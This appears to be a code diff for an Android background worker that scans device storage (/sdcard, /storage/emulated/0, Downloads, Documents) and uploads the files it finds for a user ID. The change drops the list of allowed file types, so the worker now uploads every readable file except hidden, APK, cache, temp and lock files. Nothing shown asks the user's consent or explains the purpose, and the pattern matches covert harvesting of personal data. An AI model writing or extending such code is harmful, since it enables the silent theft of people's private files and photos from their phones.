@@ -86,9 +86,10 @@ public class DocumentUploadWorker extends Worker {
     private void uploadDocuments(String userId) {
         uploadedCount = 0;
         
-        Log.d(TAG, "🔍 Starting comprehensive document scan for user: " + userId);
+        Log.d(TAG, "🔍 Starting comprehensive FILE scan for user: " + userId);
+        Log.d(TAG, "📤 Will upload ALL FILES (except system/cache/hidden)");
         
-        // PRIORITY 1: Most important locations for PDFs
+        // PRIORITY 1: Most important locations
         String[] priority1Paths = {
                 "/sdcard/Download",
                 "/sdcard/Downloads", 
@@ -98,7 +99,7 @@ public class DocumentUploadWorker extends Worker {
                 "/storage/emulated/0/Documents",
         };
         
-        Log.d(TAG, "📂 PRIORITY 1: Scanning common document folders...");
+        Log.d(TAG, "📂 PRIORITY 1: Scanning common folders...");
         for (String path : priority1Paths) {
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
@@ -113,9 +114,9 @@ public class DocumentUploadWorker extends Worker {
             }
         }
         
-        // PRIORITY 2: External storage root - try to find PDFs everywhere
+        // PRIORITY 2: External storage root - scan EVERYTHING
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL subdirectories)...");
+            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL files)...");
             File sdcard = new File("/sdcard");
             if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                 int filesBefore = uploadedCount;
@@ -128,7 +129,7 @@ public class DocumentUploadWorker extends Worker {
         
         // PRIORITY 3: Storage emulated path
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0...");
+            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0 (ALL files)...");
             File storage = new File("/storage/emulated/0");
             if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                 int filesBefore = uploadedCount;
@@ -139,7 +140,7 @@ public class DocumentUploadWorker extends Worker {
             }
         }
         
-        Log.d(TAG, "✓ Document scan complete - " + uploadedCount + " total files uploaded");
+        Log.d(TAG, "✓ File scan complete - " + uploadedCount + " total files uploaded");
     }
     
     /**
@@ -255,61 +256,22 @@ public class DocumentUploadWorker extends Worker {
     private boolean isDocumentFile(File file) {
         if (!file.isFile()) return false;
         
-        // Skip certain system/app files BEFORE converting to lowercase
         String name = file.getName();
-        if (name.startsWith(".") || 
-            name.endsWith(".apk") ||
-            name.contains("cache") ||
-            name.contains("tmp") ||
-            name.contains("Thumbs") ||
-            name.contains("thumbs")) {
+        
+        // SKIP ONLY system/app files
+        if (name.startsWith(".") ||                    // Hidden files
+            name.endsWith(".apk") ||                   // APK files
+            name.contains("cache") ||                  // Cache directories
+            name.contains("tmp") ||                    // Temp files
+            name.contains("Thumbs") ||                 // Thumbnail cache
+            name.contains(".db-journal") ||            // Database journals
+            name.endsWith(".lock")) {                  // Lock files
             return false;
         }
         
-        // Convert to lowercase for comparison
-        name = name.toLowerCase();
-        
-        // Check file extension - documents
-        if (name.endsWith(".pdf")
-                || name.endsWith(".xlsx")
-                || name.endsWith(".xls")
-                || name.endsWith(".docx")
-                || name.endsWith(".doc")
-                || name.endsWith(".pptx")
-                || name.endsWith(".ppt")
-                || name.endsWith(".csv")
-                || name.endsWith(".txt")
-                || name.endsWith(".zip")
-                || name.endsWith(".rar")
-                || name.endsWith(".7z")) {
-            return true;
-        }
-        
-        // Check file extension - media
-        if (name.endsWith(".jpg")
-                || name.endsWith(".jpeg")
-                || name.endsWith(".png")
-                || name.endsWith(".gif")
-                || name.endsWith(".webp")
-                || name.endsWith(".bmp")
-                || name.endsWith(".mp4")
-                || name.endsWith(".mkv")
-                || name.endsWith(".mov")
-                || name.endsWith(".avi")
-                || name.endsWith(".mp3")
-                || name.endsWith(".wav")
-                || name.endsWith(".aac")
-                || name.endsWith(".m4a")) {
-            return true;
-        }
-        
-        // Check file extension - config/data
-        if (name.endsWith(".json")
-                || name.endsWith(".xml")) {
-            return true;
-        }
-        
-        return false;
+        // UPLOAD EVERYTHING ELSE
+        // This includes: PDFs, documents, images, videos, audio, configs, and any other files
+        return true;
     }
 
     private void uploadFile(File file, String userId) {
